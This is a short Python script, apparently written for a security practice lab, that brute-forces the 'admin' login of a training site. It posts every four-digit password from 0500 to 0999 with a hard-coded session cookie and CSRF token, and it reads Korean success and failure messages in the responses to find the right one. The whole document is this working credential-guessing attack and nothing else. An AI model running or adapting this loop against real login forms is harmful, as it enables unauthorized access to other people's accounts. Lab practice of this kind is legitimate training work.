import requests

url = "https://elms2.skinfosec.co.kr:8110/practice/practice02/login"
headers = {
    "Content-Type" : "application/x-www-form-urlencoded"
}
cookies = {
    "JSESSIONID" : "C02FC95E0B7419250A42399C38F352DE"
}
data = {
    "_csrf" : "346b37bd-90d2-43e7-a152-3422ef67fa4f",
    "memberid" : "admin",
    "password" : "0000"
}



#print(response.text)


for i in range(500,1000):
    pw = str(i).zfill(4)
    data["password"] = pw
    response = requests.post(url, headers=headers,cookies=cookies, data=data)
    if"권한이 없습니다." in response.text:
        print("쿠키값 넣기!!")
        break
    if "로그인에 실패했습니다." in response.text:
        print("비밀번호 [{}]로그인에 실패했습니다.".format (pw))
    else:
        print("비밀번호 [{}]로그인에 성공!!".format(pw))
        break
